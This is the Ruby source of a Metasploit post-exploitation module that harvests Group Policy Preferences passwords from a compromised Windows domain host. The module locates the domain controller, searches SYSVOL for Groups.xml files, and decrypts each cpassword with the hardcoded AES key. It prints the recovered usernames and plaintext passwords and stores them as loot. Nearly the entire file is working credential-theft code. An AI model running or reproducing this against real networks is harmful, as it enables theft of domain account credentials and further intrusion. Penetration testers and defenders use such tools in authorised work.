##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/windows/priv'
require 'rexml/document'
require 'msf/core/post/common'

class Metasploit3 < Msf::Post
	include Msf::Post::Windows::Priv
	include Msf::Post::Common
	
	domain_not_found_error = 

	def initialize(info={})
		super(update_info(info,
			'Name'            => "Windows Gather Enum Group Policy Prefences Passwords",
			'Description'     => %q{
				"This module enumerates users and passwords created on the local machine
				via group policy preferences.
				Based upon work by:				 
				http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences			
				Code heavily based on enum_domain.rb and smartftp.rb modules.
				},
			'License'         => MSF_LICENSE,
			'Version'         => '$Revision: 0.1 $',
			'Platform'        => ['windows'],
			'SessionTypes'    => ['meterpreter'],
			'Author'          => ['Meatballs']
		))
	end

	def reg_getvaldata(key,valname)
		value = nil
		begin
			root_key, base_key = client.sys.registry.splitkey(key)
			open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ)
			v = open_key.query_value(valname)
			value = v.data
			open_key.close
		rescue
		end
		return value
	end

	def get_domain_controller()
		domain = nil
		begin
			subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History"
			v_name = "DCName"
			domain_controller = reg_getvaldata(subkey, v_name)
		rescue
			print_error("This host is not part of a domain.")
		end
	
		return domain_controller
	end
	
	# Recursive function that enums specific subdirs through a list of regexs to a specific path.
	def enum_subdirs(path, regex)
		# The search function takes too long as not indexed.
		# enum_groups_xml = session.fs.file.search(path, "Groups.xml", true, -1)

		enum_groups_xml = []
		current_regex = regex.pop
		begin
			session.fs.dir.foreach(path) do |sub|
				next if sub =~ /^(\.|\.\.)$/ || !(sub =~ current_regex)
				
				xmlpath= "#{path}\\#{sub}"

				if regex.length == 0
					enum_groups_xml << xmlpath
				else
					enum_groups_xml += enum_subdirs(xmlpath, regex.clone)
				end
			end
		rescue Rex::Post::Meterpreter::RequestError => e
			# Permission errors
			# print_error "Received error code #{e.code} when enumerating #{path}"
		end

		return enum_groups_xml
	end
	
	def get_xml(path)
		begin
			connections = client.fs.file.new(path, 'r')

			condata = ''
			until connections.eof
				condata << connections.read
			end
			return condata
		rescue Rex::Post::Meterpreter::RequestError => e
			print_error "Received error code #{e.code} when reading #{path}"
			return nil
		end
	end
	
	def parse_xml(data)
		mxml = REXML::Document.new(data)
		return_value = ""
		mxml.elements.each("Groups/User/Properties") do |property|
		
			next if property.attributes["cpassword"].nil?
			
			username = property.attributes["userName"]
			new_name = property.attributes["newName"]
			action = property.attributes["action"]
			disabled = property.attributes["acctDisabled"]
			cpassword = property.attributes["cpassword"]
			
			password = decrypt(cpassword)
			
			if !new_name.to_s.empty?
				username = new_name
			end
			
			output = "username: #{username}, disabled: #{disabled}, password: #{password}, action: #{action}"
			return_value << "#{username},#{disabled},#{password},#{action},\n"
			print_good(output)
		end
		
		return return_value
	end
	
	def decrypt(password)
		padding = "=" * (4 - (password.length % 4))
		password = Rex::Text.decode_base64(password + padding)
		key = ["4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"].pack("H*")
		decrypt = OpenSSL::Cipher.new("aes-256-cbc")
		decrypt.decrypt
		decrypt.key = key
		plaintext = decrypt.update(password)
		plaintext << decrypt.final
		
		return plaintext
	end

	def run
		domain_controller = get_domain_controller()
		if not domain_controller.nil?
			print_good("FOUND Domain Controller: #{domain_controller}")
			dom_info =  domain_controller.split('.')
			dom_info[0].sub!(/\\\\/,'')
			
			target_path = "#{domain_controller}\\SYSVOL\\#{dom_info[1]}.#{dom_info[2]}\\Policies"
			
			print_status("Searching #{target_path} for Groups.xml")
			
			regex = [ /^(Groups.xml)$/, /^(Groups)/, /^(Preferences)/, /^(Machine)/, /^(\{[\d\w-]*\})/ ]
			csv = "username,disabled,password,action,\n"

			for result in enum_subdirs(target_path, regex)
				xml = get_xml(result)
				unless xml.nil?
					csv << parse_xml(xml)
				end
			end
			
			print_status("Writing to loot...")
                        path = store_loot(
                                'gpp.passwords',
                                'text/plain',
                                session,
                                csv,
                                )
                        print_status("Data saved in: #{path}")

		else
			print_error("This host is not part of a domain.")
		end
	end
end
